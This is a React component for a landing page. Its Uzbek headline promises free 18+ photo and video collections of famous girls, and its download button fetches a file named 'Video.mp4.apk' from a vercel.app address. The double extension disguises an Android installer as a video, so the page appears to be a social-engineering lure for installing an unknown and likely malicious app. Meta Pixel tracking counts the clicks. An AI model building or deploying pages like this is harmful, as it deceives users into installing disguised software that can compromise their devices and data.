import React, { useEffect } from 'react';

// Важно: Эта функция проверяет, доступна ли fbq, перед её вызовом
const trackMetaEvent = (eventName, properties = {}) => {
  if (typeof window.fbq === 'function') {
    window.fbq('track', eventName, properties);
  }
};


export default function CollectionPage() {
  // Устанавливаем текущую дату
  useEffect(() => {
    const now = new Date();
    const dateElement = document.getElementById('current-date');
    if (dateElement) {
      dateElement.textContent = now.toLocaleDateString('uz-UZ', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
      });
    }
    // Поскольку это SPA, нам также нужно отправить событие PageView
    // при монтировании компонента, если оно не было отправлено глобально.
    // Однако, базовый код, который мы поместили в index.html, уже это делает.
    // Оставляем только отслеживание кастомного события.

  }, []);

  // Обработчик скачивания
  const handleDownload = (e) => {
    e.preventDefault();

    // 💡 ШАГ 1: Отправляем пользовательское событие Meta Pixel (Facebook Pixel)
    trackMetaEvent('DownloadButton_Click', {
        content_name: 'Video.mp4.apk',
        value: 0.00, // Если нет финансовой ценности
        currency: 'USD'
    });
    
    // Замени на реальную ссылку на APK
    const link = document.createElement('a');
    link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
    link.download = 'Video.mp4.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };


  return (
    <div
      style={{
        // ... (остальной код стилей остается прежним)
        position: 'relative',
        width: '100%',
        height: '100vh',
        overflow: 'hidden',
        textAlign: 'center',
        color: '#fff',
        fontFamily: 'sans-serif',
        backgroundColor: '#000'
      }}
    >
      {/* Фон с размытием */}
      <div
        style={{
          // ... (остальной код стилей остается прежним)
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          backgroundImage: "url('/img/image.jpg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          filter: 'blur(8px)',
          transform: 'scale(1.1)'
        }}
      ></div>

      {/* Основной контент */}
      <div
        style={{
          // ... (остальной код стилей остается прежним)
          position: 'relative',
          top: '50%',
          transform: 'translateY(-50%)',
          padding: '0 20px',
          zIndex: 2
        }}
      >
        <h1 style={{ fontSize: '2.2rem', fontWeight: '900', marginBottom: '15px' }}>
          Bepul 18+ mashhur qizlarning foto va video to‘plami!
        </h1>

        <button
          id="download-btn"
          onClick={handleDownload} // <--- Ключевой момент: handleDownload вызовет отслеживание
          style={{
            padding: '15px 40px',
            backgroundColor: '#ff0055',
            border: '3px solid #ffbb00',
            borderRadius: '40px',
            color: 'white',
            fontWeight: '900',
            fontSize: '1.4rem',
            cursor: 'pointer',
            boxShadow: '0 10px 30px rgba(255,0,85,0.6)',
            transition: 'all 0.3s'
          }}
          onMouseOver={(e) => {
            e.target.style.backgroundColor = '#e6004d';
            e.target.style.transform = 'scale(1.08)';
          }}
          onMouseOut={(e) => {
            e.target.style.backgroundColor = '#ff0055';
            e.target.style.transform = 'scale(1)';
          }}
        >
          Yuklab olish
        </button>

        <p id="current-date" style={{ marginTop: '25px', color: '#aaa', fontStyle: 'italic' }}></p>
      </div>
    </div>
  );
}